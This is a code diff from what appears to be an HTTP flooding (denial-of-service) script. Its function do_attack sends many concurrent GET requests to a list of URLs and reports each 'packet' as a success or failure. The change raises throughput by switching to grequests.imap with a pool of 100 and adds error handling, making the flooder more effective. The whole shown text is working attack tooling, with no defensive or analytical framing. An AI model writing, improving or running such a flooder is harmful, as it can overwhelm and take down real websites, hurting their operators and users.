@@ -23,12 +23,15 @@ def do_attack():
         urls.append(url)
 
     responses = (grequests.get(u, timeout=5) for u in urls)
-    result_map = grequests.map(responses, exception_handler=exception_handler)
+    result_map = grequests.imap(responses, exception_handler=exception_handler, size=100)
     for result in result_map:
-        if result.status_code == 200:
-            print(Fore.GREEN + f"[+] Packet sequence-{result_map.index(result) + 1} Succeed: {result.status_code}")
+        if result is not None:
+            if result.status_code == 200:
+                print(Fore.GREEN + f"[+] Packet Succeed: {result.status_code}")
+            else:
+                print(Fore.RED + f"[-] Packet Failed: {result.status_code}")
         else:
-            print(Fore.RED + f"[-] Packet sequence-{result_map.index(result) + 1} Failed: {result.status_code}")
+            print("[-] Packet Failed: Request Failed")
 
 if __name__ == "__main__":
     do_attack()
